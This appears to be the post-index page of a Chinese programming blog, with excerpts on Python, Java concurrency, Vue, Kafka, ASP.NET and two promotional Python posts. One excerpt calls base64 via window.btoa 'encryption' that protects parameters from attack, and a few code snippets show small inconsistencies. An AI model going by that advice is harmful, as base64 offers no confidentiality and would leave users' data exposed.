<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffeea17d090975cd75de9bd18896fa81/" rel="bookmark">
			python在线编辑random-使用Python脚本生成随机IP的简单方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求
在某应用中，需要根据一定的规则生成随机的IP地址，规则类似于192.168.11.0/24这样的CIDR形式给出。
实现
经过艰苦卓绝的调试，下面的代码是可以用的：
RANDOM_IP_POOL=['192.168.10.222/0']
def __get_random_ip():
str_ip = RANDOM_IP_POOL[random.randint(0,len(RANDOM_IP_POOL) - 1)]
str_ip_addr = str_ip.split('/')[0]
str_ip_mask = str_ip.split('/')[1]
ip_addr = struct.unpack('&gt;I',socket.inet_aton(str_ip_addr))[0]
mask = 0x0
for i in range(31, 31 - int(str_ip_mask), -1):
mask = mask | ( 1 &lt;&lt; i)
ip_addr_min = ip_addr &amp; (mask &amp; 0xffffffff)
ip_addr_max = ip_addr | (~mask &amp; 0xffffffff)
return socket.inet_ntoa(struct.pack('&gt;I', random.randint(ip_addr_min, ip_addr_max)))
生成的结果如：
192.168.10.175 192.168.10.29
192.168.10.30 192.168.10.207
192.168.10.248 192.168.10.145
192.168.10.168 192.168.10.223
192.168.10.66 192.168.10.138
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffeea17d090975cd75de9bd18896fa81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/568a8a40f6a274d48954f2e001b6af8e/" rel="bookmark">
			连续子数组的最大和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、需求 输入一个整型数组，数组中的一个或连续多个整数组成一个子数组； 求所有子数组的和的最大值，且时间复杂度为O(n)。
示例1: 输入: nums = [-2,1,-3,4,-1,2,1,-5,4] 输出: 6 解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 二、暴力法 2.1 思路分析
当然了，暴力法不符合题意，但是也是最先想到的，既然想到了，那就把它实现出来吧；具体注释写在代码上； 2.2 代码实现
class Solution { public int maxSubArray(int[] nums) { int res = Integer.MIN_VALUE; for(int i = 0; i &lt; nums.length; i++) { //这里直接将非正数略过 if(nums[i] &lt;= 0) continue; int temp = 0; for(int j = i; j &lt; nums.length; j++) { temp += nums[j]; if(res &lt; temp) res = temp; } } //sort默认升序排序，当数组中元素值全为零或负数时，需返回最大值 Arrays.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/568a8a40f6a274d48954f2e001b6af8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94154af350c0c7b38452052c0fb9e02e/" rel="bookmark">
			elementUI自定义主题配色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 之前的项目里面用elementUI时，一直使用的都是默认配色。看久了，都有点视觉疲劳了，所以想着去更改一下它的主题配色。在网上看到了很多修改颜色的方式，也走了很多弯路。为了让自己下次修改主题配色的时候能够游刃有余，在这里就用命令行修改主题的方式记录一下吧。
官方文档 官方自定义主题配色方案
命令行方式 首先安装一个主题生成工具，建议不用全局安装
npm i element-theme -D
然后安装白垩主题
npm i element-theme-chalk -D
初始化变量文件，从这步开始比较重要。因为前面我是使用的局部安装，所以不能直接通过 et 来调用工具。
// 第一步如果是全局安装，使用这个命令
et -i 【自定义变量文件】
// 第一步如果是局部安装，使用这个命令
node_modules/.bin/et -i 【自定义变量文件】
上面这一步完成之后，在项目根目录下默认就会生成scss文件，如果不想生成到根目录（为了项目的的阅读性，还是建议生成到指定路径），可以在【自定义变量文件】这里加上完整的路径和变量名，记得一定要以scss文件类型结尾
// 自定义输出文件路径
node_modules/.bin/et -i ./src/static/css/element-diy.scss
这个时候，命令行就会提示你，生成了一个指定的scss文件。然后在项目中打开这个你刚刚新建的scss文件，找到下面的代码，并且修改成自己想要的颜色。保存文件，然后重新编译。
修改颜色之后，保存文件，然后重新编译。
// 输出到根目录
// 第一步初始化变量时如果是全局安装
et
// 第一步初始化变量时如果是局部安装S
node_modules/.bin/et
// 自定义输出文件路径
加-c是因为用的自定义变量名，所以需要通过加一个-c参数，后面跟一个路径（这个路径就是上一步新建的那个scss文件的那个路径）；然后再在后面加一个-o参数，再跟一个路径，表示需要输出到的指定路径
node_modules/.bin/et -c ./src/static/css/element-diy.scss -o ./src/static/css/theme
这一步完成之后，就会在你刚刚指定的路径那里新建一个theme的文件夹，然后我们把引入Element的那个样式文件修改成theme文件下面的一个index.css就可以了。
然后在引入Element的文件中，将原来的样式注释掉，修改成自己上一步生成的theme文件夹里面的index.css文件，保存文件。重新运行项目名就OK了。
结果 结束语 前端小白。文章如有错误之处，敬请指出！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad30933351d9ffc2edb7e95fbd9fe6ff/" rel="bookmark">
			vue项目中使用视频插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		昨天写一个非物质文化遗址展览项目需要用到视频播放这块，
所以了我就在网站找了一下插件最后确定了就用 vue-vedio-player
首先我们先安装这个插件
npm install vue-video-player -s 我们需要在main.js里面导入并引用
import VideoPlayer from 'vue-video-player' import 'vue-video-player/src/custom-theme.css' import 'video.js/dist/video-js.css' Vue.use(VideoPlayer) 那么我们怎么使用了？
html部分
&lt;template&gt; &lt;div class='demo'&gt; &lt;video-player class="video-player vjs-custom-skin" ref="videoPlayer" :playsinline="true" :options="playerOptions"&gt; &lt;/video-player&gt; &lt;/div&gt; &lt;/template js部分
&lt;script&gt; export default { data() { return { playerOptions: { //播放速度 playbackRates: [0.5, 1.0, 1.5, 2.0], //如果true,浏览器准备好时开始回放。 autoplay: false, // 默认情况下将会消除任何音频。 muted: false, // 导致视频一结束就重新开始。 loop: false, // 建议浏览器在&lt;video&gt;加载元素后是否应该开始下载视频数据。auto浏览器选择最佳行为,立即开始加载视频（如果浏览器支持） preload: 'auto', language: 'zh-CN', // 将播放器置于流畅模式，并在计算播放器的动态大小时使用该值。值应该代表一个比例 - 用冒号分隔的两个数字（例如"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad30933351d9ffc2edb7e95fbd9fe6ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbfb3670eea0189e48d4a708a462ff58/" rel="bookmark">
			pytorch遇到的一些坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pytorch遇到的一些非常害人的坑 一、tensor.scatter()暗含的坑 一、tensor.scatter()暗含的坑 tensor.scatter()方法pytorch官方文档讲解的还是很详细的，如下图所示：
有一个坑就是：**index参数必须是torch.int64 or torch.long！torch.int32 or torch.int都是不可以的！**否则的话，会报一些匪夷所思的错误！如下图所示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f9df5fced6aa4f3cfa9d63e170811b5/" rel="bookmark">
			java Monitor对象监视器、对象头、mark word
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Monitor监视器java对象头Monitor Monitor监视器 每一个对象都有一个monitor与之关联，当且一个monitor被持有后，它将处于锁定状态。线程执行到monitorenter 指令时，将会尝试获取对象所对应的monitor的所有权，即尝试获得对象的锁。
java对象头 这里重点关注对象头中的Mark Word。
MarkWord里默认数据是存储对象的HashCode等信息,但是在运行期间，Mark Word里存储的数据会随着锁标志位的变化而变化。
重量级锁也就是通常说synchronized的对象锁，锁标识位为10，其中指针指向的是monitor对象（也称为管程或监视器锁）的起始地址。
Monitor monitor在JVM中是基于C++的实现的，ObjectMonitor中有几个关键属性：
_owner：指向持有ObjectMonitor对象的线程
_WaitSet：存放处于wait状态的线程队列
_EntryList：存放处于等待锁block状态的线程队列
_recursions：锁的重入次数
_count：用来记录该线程获取锁的次数
当多个线程同时访问一段同步代码时，首先会进入_EntryList队列中，当某个线程获取到对象的monitor后进入_Owner区域并把monitor中的_owner变量设置为当前线程，同时monitor中的计数器_count加1。即获得锁。
若持有monitor的线程调用wait()方法，将释放当前持有的monitor，_owner变量恢复为null，_count自减1，同时该线程进入_WaitSet集合中等待被唤醒。
若当前线程执行完毕也将释放monitor(锁)并复位变量的值，以便其他线程进入获取monitor(锁)
notify 方法： 从等待队列中唤醒任意一个线程,使该线程退出等待队列，进入可运行状态，也就是notify()方法仅通知一个线程。
notifyAll 方法： 使所有正在等待队列中线程退出等待队列，进入就绪状态。
wait 方法： 阻塞
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c148d96a9aecb860e788c17739d992b8/" rel="bookmark">
			java多线程Thread.sleep方法用法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 sleep() Thread.sleep(long millis) Thread.sleep(long millis, int nanos) Thread.sleep(long millis)指定线程阻塞的毫秒数；
时间到达后，线程进入就绪状态；
注意：sleep方法不会释放锁；
底层是native方法
public static native void sleep(long millis) throws InterruptedException; 使用
try { //让当前线程阻塞1s Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9b8df5bca2312a905174543d4766ffb/" rel="bookmark">
			java多线程join()方法原理详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		join() 在线程中调用另一个线程的join()方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。
join()方法的源码
public final synchronized void join(long millis) throws InterruptedException { long base = System.currentTimeMillis(); long now = 0; if (millis &lt; 0) { throw new IllegalArgumentException("timeout value is negative"); } if (millis == 0) { while (isAlive()) { wait(0); } } else { while (isAlive()) { long delay = millis - now; if (delay &lt;= 0) { break; } wait(delay); now = System.currentTimeMillis() - base; } } } 不要在意源码细节，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9b8df5bca2312a905174543d4766ffb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04d6f923633c555f5ab1caa953e97baf/" rel="bookmark">
			vue文本间空格的占位符\u3000     /     三种空格unicode(\u00A0,\u0020,\u3000)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 \u3000
三种空格unicode(\u00A0,\u0020,\u3000)表示的区别 1.不间断空格\u00A0,主要用在office中,让一个单词在结尾处不会换行显示,快捷键ctrl+shift+space ; 2.半角空格(英文符号)\u0020,代码中常用的; 3.全角空格(中文符号)\u3000,中文文章中使用; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d21e4eb16dc63ca5ea8747bff1aece6/" rel="bookmark">
			python编程入门 适合于零基础朋友-零基础能学好python吗？教女朋友学python是送命题吗？...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python近年来的风靡程度就不用小编多说了，大家伙儿都知道，也都想来蹭蹭热度，但蹭着蹭着蹭出问题了：教女朋友学python是送命题吗?教女朋友学python是送命题吗?
近期，网友提出的"教女朋友学Python是道送命题”的话题引起了热议。具体流程图如下：
但是关于这个观点，小编坚决不买账。
第一，女票并没有这么笨
第二，学Python并没有这么难
之所以有越来越多的人喜欢Python，正是基于Python简单、高效的天然属性。
拒绝花俏，Python语言堪称新手友好型语言典范
Python开发者一般会拒绝花俏的语法，而选择明确的没有或者很少有歧义的语法。Python源代码具备更好的可读性，并且能够支撑大规模的软件开发。
Python简化的语法更贴近自然语言，即便是零基础的初学者也可以编写代码更好地执行。Python作为新手友好型语言典范，圈粉无数，获得了广大编程初学者的欢迎。对非计算机科班出身的学生更是来者不拒，涉足IT互联网领域，Python绝对是个不错的突破口。
简单易学，Python已经成为人工智能领域专属语言
Python虽然是脚本语言，但是非常易于入门，迅速成为科学家的工具。从而积累了大量的工具库、架构，人工智能涉及大量的数据计算，用Python是很自然的，简单高效，开发效率奇高，在人工智能领域大有作为，从而使Python语言变得更有魅力。
语法简明，奉行"高效至上”哲学
Python的语法简单，代码可读性高，容易入门。Python的哲学是"做一件事情应该只有一种最好的方法”，对于初学者规范自己的学习有很大帮助，同时也帮助初学者能够读懂其他人的代码养成良好的习惯。Python在其他领域，比如科学计算等等有广泛的运用，对于学一门语言作为工具来说，Python很合适。
0基础能学好Python吗?
Python应用广泛，兼职赚钱，那么，0基础适合学Python么?
小编只能说非常合适，因为在目前的编程语言中，Python的抽象程度是最高的，是最接近自然语言的，非常容易上手，Python
可以让你更好的理解编程这件事情。
如果做一个项目，Java需要100行代码，那么Python只需要10行代码就够了。这也是为什么Python这么火爆的原因。
Java 语言Hello World 代码：
public class HelloWorld {
public static void main(String[] args){
System.out.println("Hello World!");
}
}
Python 语言Hello World代码：
print("Hello World!"
仅仅是一个Hello World程序，就能看出区别了，是不是?
Python
是一门对新手友好、功能强大、高效灵活的编程语言，学会之后，无论是想进入数据分析、人工智能、网站开发这些领域，还是希望掌握第一门编程语言，都可以用 Python
来开启无限未来的无限可能!
◆ ◆ ◆ ◆ ◆
顺应技术趋势，学习Python人工智能，我们达内python培训班为你准备了0基础免费入门课程，10月16-19日开课，python前辈带领入门，避免走弯路。
感谢您的阅读，以上就是零基础能学好python吗?教女朋友学python是送命题吗的简单解读，希望对你有所启发，更多python相关的问题欢迎您来达内python培训机构进行咨询。
免责声明：内容和图片源自网络，版权归原作者所有，如有侵犯您的原创版权请告知，我们将尽快删除相关内容。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa26ce5d6ecc4fa206721dc4ded389f8/" rel="bookmark">
			python编程入门书籍-最适合Python初学者的6本书籍推荐「必须收藏」
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原标题：最适合Python初学者的6本书籍推荐「必须收藏」
Python是一种通用的解释型编程，主要用于Web开发、机器学习和复杂数据分析。Python对初学者来说是一种完美的语言，因为它易于学习和理解，随着这种语言的普及，Python程序员的机会也越来越大。
如果你想学习Python编程，市场上就有很多的书籍。近日，hackr社区推荐了6本最佳的Python书籍。是2018年最受编程社区成员推荐的Python书，该列表还包括一些为初学者准备的免费Python书籍。
适合初学者的最佳Python书籍
1、《Python编程：从入门到实践》
埃里克·马瑟斯的这本《Python编程：从入门到实践》是一本快速，全面的Python语言入门教程，适合初学者，他们希望学习Python编程并能够编写出有用的程序。本书旨在让读者快速上手编写真正的程序。本书也适用于对语言有模糊理解并希望在尝试Python编程之前了解其知识的程序员。在学习本书时，你将学习使用Numpy和matplotlib等库和工具，并使用数据创建令人惊叹的可视化效果。你还将了解2D游戏和Web应用程序背后的思想以及如何创建它们。
这本560页长的书主要分为两部分。本书的第一部分讨论了Python编程的基础知识，并阐述了字典，列表，循环和类等概念，在此部分你将了解Python程序的工作原理，并学习如何编写干净且可读的代码来创建交互式程序，第一部分最后讲解的主题是关于测试代码。本书的第二部分遵循实用的方法，通过使用Python的库实现三个不同的项目，街机游戏，简单的Web应用程序和数据可视化，帮助你检验通过这本书你都学到了什么
如果你在学习Python的过程当中有遇见任何问题，可以加入我的python交流学习秋秋qun：九三四、一零九、一七零，多多交流问题，互帮互助，群里有不错的学习教程和开发工具。学习python有任何问题（学习方法，学习效率，如何就业），可以随时来咨询我
2、《Head-First Python (2nd edition)》
如果你想要学习Python编程的基础知识，并且不想要看一堆乏味难懂的书籍和教程。那么Paul Barry的《Head First Python》就是你的不二之选，它将帮助你快速掌握Python编程的基础知识，并使用内置函数和数据结构。然后，本书将帮助你构建自己的Web应用程序，异常处理，数据争论和其他概念。
作者是Paul Barry，是一位讲师。在进入学术界之前，他在IT行业工作了十多年。他是许多著名编程书籍的作者。
3、《"笨方法”学Python》
这本书结构很简单，是52个习题的集合。你必须认真阅读这些习题的代码并准确输入，然后你还得修复代码中的Bug，以便更好地理解并观察程序的运行情况。在这个过程中，你将了解软件是如何工作的，好的程序看起来是什么样子，怎样阅读、编写、思考代码，以及如何用专业程序员的技巧来找出并修正错误。
本书通过帮助你安装完整的Python环境开始，接着教你如何编写优化的代码。然后，本书讨论了基础数学，变量，字符串，文件，循环，程序设计和数据结构等主题。本书非常适合想通过语言的核心来学习Python编程的初学者。作者是Zed A. Shaw，他是Hard Way系列的创建者，该系列包括有关C，Python和Ruby编程语言的书籍。
4、《Python程序设计（第3版）》
John Zelle的《Python程序设计》，与其把它当做Python编程的代码介绍，不如把它当做是一本关于编程艺术的介绍，这本书将向你介绍计算机科学、编程以及其他相关的概念，只是使用Python语言作为初学者的媒介，本书以最适合初学者的方式讨论，因此书中的概念是非常有趣并易于理解
第三版中最显著的变化就是几乎删除了所有python eval()库的使用，并增加了一个讨论其缺点的部分，最新版本还使用了新的图形示例。
5、《像计算机科学家一样思考Python (第2版)》
本书按照培养读者像计算机科学家一样的思维方式的思路来教授Python语言编程。作者从最基本的编程概念开始讲起，包括语言的语法和语义，而且每个编程概念都有清晰的定义，引领读者循序渐进地学习变量、表达式、语句、函数和数据结构。此外，书中还探讨了如何处理文件和数据库，如何理解对象、方法和面向对象编程，如何使用调试技巧来修正语法、运行时和语义错误。
本书是遵循GUN自由文档许可，可以被免费下载和打印，已经被翻译成西班牙语、意大利语、德语、捷克语、中文等
6、《A Byte of Python》
这是另外一本关于Python的免费书籍，本书主要讨论Python 3版本，这本书有超过26种语言可供选择，包括土耳其语、瑞典语、法语、汉语、德语、西班牙语、俄语、乌克兰语、葡萄牙语和朝鲜语。这些翻译是由活跃的社区成员提供的
这本书首先介绍了这本书是关于什么的，然后介绍Python以及它如何成为编程世界中最强大的语言之一。然后介绍Python概念，并在每个示例的步骤中详细讲解。在阅读完本书之后，你还需要继续深入学习Python返回搜狐，查看更多
责任编辑：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/037d02e6ee293d61b9659862fc37127e/" rel="bookmark">
			Lock Free (无锁并发)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.cnblogs.com/demian/p/11141733.html
CAS( compare and swap) 原子操作，保证了如果需要更新的地址没有被其他进程(线程)改动过，那么它可以安全的写入。而这也是我们对于某个数据或者数据结构加锁要保护的内容，保证读写的一致性，不出现dirty data。可在循环中不断执行CAS，如果共享变量没有改变，那么swap，在当前环境中写入，否则继续do-while的Retry-Loop。
1 int compare_and_swap (int* reg, int oldval, int newval) { 2 ATOMIC(); 3 int old_reg_val = *reg; 4 if (old_reg_val == oldval) 5 *reg = newval; 6 END_ATOMIC(); 7 return old_reg_val; 8 } ABA问题最容易发生在lock free算法中的，地址被重用的情况
无锁相当于“锁”的粒度变小了，主要是“锁”HEAD和TAIL这两个关键资源。而不是整个数据结构。
无锁与自旋锁比较：
无锁
自旋锁
自旋锁与互斥锁比较：
1. 自旋锁不会使线程状态发生切换，一直处于用户态，即线程一直都是active的；不会使线程进入阻塞状态，减少了不必要的上下文切换，执行速度快
2. 互斥锁在获取不到锁的时候会进入阻塞状态，从而进入内核态，当获取到锁的时候需要从内核态恢复，需要线程上下文切换。 （线程被阻塞后便进入内核（Linux）调度状态，这个会导致系统在用户态与内核态之间来回切换，严重影响锁的性能）
自旋锁：线程获取锁的时候，如果锁被其他线程持有，则当前线程将循环等待，直到获取到锁。自旋锁等待期间，线程的状态不会改变，线程一直是用户态并且是活动的(active)。自旋锁如果持有锁的时间太长，则会导致其它等待获取锁的线程耗尽CPU。自旋锁本身无法保证公平性，同时也无法保证可重入性。基于自旋锁，可以实现具备公平性和可重入性质的锁。TicketLock:采用类似银行排号叫好的方式实现自旋锁的公平性，但是由于不停的读取serviceNum，每次读写操作都必须在多个处理器缓存之间进行缓存同步，这会导致繁重的系统总线和内存的流量，大大降低系统整体的性能。CLHLock和MCSLock通过链表的方式避免了减少了处理器缓存同步，极大的提高了性能，区别在于CLHLock是通过轮询其前驱节点的状态，而MCS则是查看当前节点的锁状态。 Mutex主要解决并发实体之间的互斥的问题，而semaphone主要解决并发实体之间的同步问题。针对一些临界区比较少，处理开销比较小，而且实时性要求比较高的场景可以使用spin_lock来替代mutex实现互斥, 而如果需要共享的数据只有一个字段，可以使用lock-free的方式来替代spin_lock从而达到更高的性能。
条件变量：
用wait和signal实现同步互斥，其中这两个操作需要用互斥量包裹，互斥锁+条件变量可以实现读写锁(多个读锁可以进入临界区，只有一个写锁进入临界区，读写锁同时只能有一种进入临界区)
条件变量是进程中的全局变量(针对线程)，信号量是系统中的全局变量(针对进程)
参考博客: gaochundong
coolshell
IBM developer
自旋锁
CAS源码解读
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c99182542f819bcb0c1b753f81d0dfe7/" rel="bookmark">
			Python复制整个目录和文件内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 import shutil def copy_dir(src_path,target_path): filelist_src = os.listdir(src_path)#用于返回一个文件名和目录名 for file in filelist_src:#遍历所有的文件或文件夹 src_path_read_new =os.path.join(os.path.abspath(src_path),file) target_path_write_new = os.path.join(os.path.abspath(target_path),file) if os.path.isdir(src_path_read_new):#判断该读入路径是否是目录文件夹，如果是文件夹执行递归 if not os.path.exists(target_path_write_new):#判断目标路径是否存在该文件夹 os.mkdir(target_path_write_new)#没有就创建文件夹 copy_dir(src_path_read_new,target_path_write_new)#递归 else:#如果是文件，执行复制 shutil.copy(src_path_read_new,target_path_write_new) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b12c412ac7c8dfbaca5d5793b7c06cf8/" rel="bookmark">
			谷歌浏览器官网下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.google.cn/chrome/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4b37e2a73cfe488e44e81715cc997e7/" rel="bookmark">
			前端-传参安全处理window.btoa base64加密，线性对称加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端参数传输安全的必要性 我们在任何场合都不应该直接或间接的暴露用户信息，或核心参数指标在浏览器上即是做不到无法查看也应做基本的加密处理放置恶意攻击或信息泄露
那么如何保证自己前端简单又便捷的生成加密参数呢
1.我们可以使用window.btoa（） window对象自带的一个base64加密规则实现 前提参数需要时独立的string。 解密方式 是将加密后的文本使用window.atob(Str) 注意Str: 必需是一个通过 btoa() 方法编码的字符串。
代码中我们可以这样使用
/* * 根据条件查找 * @params{} * */ searchTemplate=()=&gt;{ let info="" this.props.form.validateFields((err, values) =&gt; { if(!err){ console.log(window.btoa(values.carId)) let data={ carId:window.btoa(values.carId), data:values.data, timeRange:[moment(values.timeRange[0]).format('YYYY-MM-DD HH:mm:ss'), moment(values.timeRange[1]).format('YYYY-MM-DD HH:mm:ss')] } console.log("getData",data) //根据查询结果显示不同信息内容 info="数据生成失败，请重新设置条件查询" this.setState((state)=&gt;({visible: true,modalInfo:info})); } }) } console.log(window.btoa(values.carId)) 这部分将是我们的加密参数 特别提醒 需要告知你的后端同学你的参数使用的是Base64加密了 不然他会生气的~~
接下来我们介绍几种稍微偏专业一些的知识，介于本人学生时代学习过密码学的基础
首先亮出第一种简单的应用
“对称加密”: 看过抗日神剧的同学或者有所听闻的都知道，摩斯码的解密需要一个密码本，密码工作者需要这密码本来进行解密。无论你传输的多么复杂。规则的制定者始终都由这个密码本的建立者掌握
这其实就是密码学中基本的也是应用最广的可变性最大的‘对称加密’
举个例子我想传输的是明文‘3, 4,5’ 我的秘钥规定是‘+2’ 那么规则下我实际传输的密文‘1, 2，3’ 。当接收者知道我的秘钥后我就可以知道其实他说的是‘3,4，5’
升级版本来了
1.替代密码 密钥字符（仅支持单个字符密钥）的ASCII码值范围为[32,126](可见、可输入字符)，加密运算利用密钥字符的ASCII码值进行加密，产生的每个密文字符ASCII码值也在[32,126]之内；解密运算利用密钥字符的ASCII码值进行解密，产生的每个明文字符ASCII码值也在[32,126]之内； #include&lt;iostream&gt; using namespace std; void jiami(); void jiemi(); char a[100]; char b[100]; char k; void jiami() { int i=0; cout&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4b37e2a73cfe488e44e81715cc997e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fcd99c3ee2d355c9814ace7ca91b843/" rel="bookmark">
			大数据消息处理中间件之kafka win10快速部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、环境准备
1、安装包下载
2、配置环境变量
二、修改配置文件
1、zookeeper.properties
2、server.properties
三、启动服务
1、启动zookeeper
2、启动kafka服务
3、创建topic
4、查看topic
5、producer发送消息
6、consumer接收消息
7、删除topic
四、kafka可视化工具
1、Kafka Tools
2、Kafka Eagle
五、一键启动脚本
1、win10搭建kafka环境
2、win10搭建flink环境
3、一键启动脚本
一、环境准备 kafka官网：Apache Kafka
kafka中文：kafka中文教程 - OrcHome
1、安装包下载 jdk1.8：Java Downloads | Oracle
scala12.11：Download | The Scala Programming Language
kafka 2.11-2.4.1：Kafka 中文文档 - ApacheCN
2、配置环境变量 1、分别配置java、scala、kafka HOME变量
2、将HOME目录对应的bin目录添加到path环境变量
由于是windows环境下使用的是bat脚本而不是shell脚本，所有这里配置的目录是%KAFKA_HOME%\bin\windows
二、修改配置文件 1、zookeeper.properties zookeeper数据目录：D://Hadoop//Kafka//kafka_2.11-2.4.1//zkdatadir
dataDir=D://Hadoop//Kafka//kafka_2.11-2.4.1//zkdatadir clientPort=2181 maxClientCnxns=0 admin.enableServer=false 2、server.properties kafka日志目录：D://Hadoop//Kafka//kafka_2.11-2.4.1//logs
broker.id=0 num.network.threads=3 num.io.threads=8 socket.send.buffer.bytes=102400 socket.receive.buffer.bytes=102400 socket.request.max.bytes=104857600 log.dirs=D://Hadoop//Kafka//kafka_2.11-2.4.1//logs num.partitions=1 num.recovery.threads.per.data.dir=1 offsets.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fcd99c3ee2d355c9814ace7ca91b843/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4c7140ce6403e681446d8fa5ac0f4c6/" rel="bookmark">
			同一页面多个ajax请求后台堵塞问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自：https://blog.csdn.net/leftfist/article/details/82805674
Asp.Net 页面ajax异步并发请求变成“单线程工作”的可能原因以及解决办法 1. 可能原因： HttpSessionState来自于HttpModule的SessionStateModule。在每次请求处理过程中，HttpApplication的请求的处理管道中会检查当前请求的处理程序是否实现了接口IRequiresSessionState，
如果实现的话，那么SessionStateModule将为这个请求分配HttpSessionState。同时SessionStateModule还负责SessionID的生成、Cookieless会话管理、从外部状态提供程序中检索会话数据以及将数据绑定到请求的调用上下文。
如果页面请求设置一个读取器锁定，同一会话中同时处理的其他请求将无法更新会话状态，但是至少可以进行读取。 如果页面请求为会话状态设置一个写入锁，那么所有其他页面都被阻止，无论他们是否要读取或写入内容。
例如，如果同时有两段程序视图在同一个Session中写入内容，一段程序必须等到另一段程序完成后才能写入。
在AJAX程序设计中，必须注意这种情况的发生
2.解决方法 对于Asp.net MVC: 可以为本Controller增加以下特性，但是本Controller都不能修改Session了，只能读取；
如果没有这个特性，多个ajax请求到了后台，原本是并发的，结果变成了队列，一个接一个地完成。如果加上，则是并行完成。
//session只读，避免同一会话中session锁导致请求阻塞，加上后本控制器内将无法再进行session修改，只能读取 [SessionState(System.Web.SessionState.SessionStateBehavior.ReadOnly)] public class xxController : BaseLT.Web.UserControllerBase { } 对于Asp.net WebForm： 在Web.config 文件里面添加
EnableSessionState="ReadOnly" // 仅仅加载那个阻塞页面 经测试，已解决问题。
个中原因，可以看以下参考资料：
ASP.net Session阻塞、Session锁、MVC Action请求阻塞问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
